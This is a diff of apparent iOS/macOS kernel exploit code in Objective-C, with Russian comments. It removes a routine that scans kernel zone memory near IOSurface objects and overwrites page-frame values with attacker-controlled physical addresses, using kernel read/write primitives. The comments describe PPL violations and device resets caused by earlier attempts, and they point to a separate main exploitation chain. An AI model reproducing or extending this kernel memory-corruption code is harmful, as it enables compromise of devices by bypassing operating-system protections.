@@ -6310,56 +6310,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 }
             }
         }
-        kpNote(r, [NSString stringWithFormat:@"  [DEP] хранилищ pfn: %d — патчим на ctlPFN %#x (PA %#llx)", nDep, ctlPFN, (unsigned long long)ctlPA]);
-        // 1.9.221: запись яда ТОЛЬКО через zone-VA — physmap-хит страница может
-        // быть physmap-RO (паника на записи, 1.9.220 форма1 @ physmap). Ищем
-        // zone-VA той же страницы контент-поиском по значению хита (уникально)
-        // в окне вокруг IOSurface-объектов (аренные структуры кластерятся).
-        uint64_t pdZ = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
-        uint64_t roZ = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
-        uint64_t anch[3] = { surfVA, pdZ, roZ };
-        uint64_t mnZ = ~0ULL, mxZ = 0;
-        for (int a = 0; a < 3; a++) if (kpLooksLikeKernelPointer(anch[a])) { if (anch[a] < mnZ) mnZ = anch[a]; if (anch[a] > mxZ) mxZ = anch[a]; }
-        for (int i = 0; i < nDep; i++) {
-            uint64_t nq = hitOld[i];
-            if (hitForm[i] == 1) nq = (hitOld[i] & 0x3fffULL) | ctlPA;
-            else if (hitForm[i] == 3) nq = ((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL);
-            else if (hitForm[i] == 2) nq = (uint64_t)ctlPFN;
-            // zone-scan значения хита
-            uint64_t zva = 0;
-            if (mnZ != ~0ULL) {
-                uint64_t lo = (mnZ & ~0x3fffULL) - 0x2000000ULL, hi = (mxZ & ~0x3fffULL) + 0x2000000ULL;
-                for (uint64_t pg = lo; pg < hi && !zva; pg += 0x4000) {
-                    if (!kpSafeToRead(pg)) continue;
-                    // 1.9.226: контент ТОЛЬКО типов {0x21,0x6,0xc} — табличные 0x9
-                    // могут быть PPL-read-защищены (смерть zone-скана 1.9.223 ×2);
-                    // спек/hit-хранилища — kalloc-объекты именно этих типов.
-                    uint64_t ppa226 = kvtophys(pg);
-                    int pft226 = ppa226 ? kpFrameTypeOf(ppa226) : -1;
-                    if (!(pft226 == 0x21 || pft226 == 0x6 || pft226 == 0xc)) continue;
-                    uint8_t zbuf[0x4000];
-                    kreadbuf(pg, zbuf, sizeof(zbuf));
-                    for (uint32_t o = 0; o + 8 <= sizeof(zbuf) && !zva; o += 8) {
-                        uint64_t q = 0; memcpy(&q, zbuf + o, 8);
-                        if (q != hitOld[i]) continue;
-                        if (pg + o == hitAddr[i]) continue;   // physmap-алиас сам себя
-                        zva = pg + o;
-                    }
-                }
-            }
-            if (!zva) {
-                kpNote(r, [NSString stringWithFormat:@"    [DEP]#%d форма%d @ physmap %#llx — zone-VA НЕ найден, хит пропущен (устройство живо, яд не вписан)", i, hitForm[i], (unsigned long long)hitAddr[i]]);
-                hitForm[i] = -1;   // retry/forge/final-restore пропустят
-                continue;
-            }
-            kpNote(r, [NSString stringWithFormat:@"    [DEP]#%d форма%d zone-VA %#llx: %#018llx → %#018llx",
-                      i, hitForm[i], (unsigned long long)zva, (unsigned long long)hitOld[i], (unsigned long long)nq]);
-            usleep(2000);
-            early_kwrite64(zva, nq);
-            uint64_t rb2 = early_kread64(zva);
-            kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb2, rb2 == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
-            hitAddr[i] = zva;   // все последующие записи (retry/forge/restore) — через zone-VA
-        }
+        kpNote(r, [NSString stringWithFormat:@"  [DEP] хранилищ pfn: %d (форма4 исключена) — DEP-яд УБРАН (1.9.230)", nDep, ctlPFN, (unsigned long long)ctlPA]);
+        // 1.9.230: DEP-яд с zone-сканом УБРАН ВООБЩЕ — три трупа подряд: голый pfn
+        // совпадает и в ЧУЖИХ страницах (pmap/pv/PT-структуры хранят PA-значения),
+        // патч не туда = PPL-нарушение = тихий ресет (1.9.223 ×2, 1.9.229). Скан
+        // остаётся диагностикой, записей ноль. Основной путь — OPC-цепь (оффсеты,
+        // безопасные zone-чтения, без охоты по значениям). Хиты НЕ патчим:
+        for (int i = 0; i < nDep; i++) hitForm[i] = -1;
     }
     // 1.9.198: VA-FIELD DEPUTY — 1.9.197 доказал: prepare считает PA = vtophys
     // (kernel VA буфера) на лету (слот откатился в ОРИГИНАЛ при пропатченных
